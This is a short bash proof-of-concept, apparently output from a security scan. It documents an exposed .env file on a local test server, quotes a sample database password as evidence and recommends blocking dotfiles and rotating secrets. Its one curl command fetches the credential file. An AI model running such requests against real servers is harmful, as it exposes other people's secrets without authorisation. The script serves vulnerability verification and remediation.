#!/bin/bash
# PoC: Exposed Environment File (.env) (MISCONF-001)  CVSS 9.8
# Target: 127.0.0.1
# Verified evidence: HTTP 200 — environment file with credential keys (password) — body: "APP_ENV=production\nDB_PASSWORD=hunter2"
# Remediation: Block dotfiles at the edge and rotate every secret in the file.
set -u
curl -s -D- "http://127.0.0.1:18080/.env" | head -c 2000
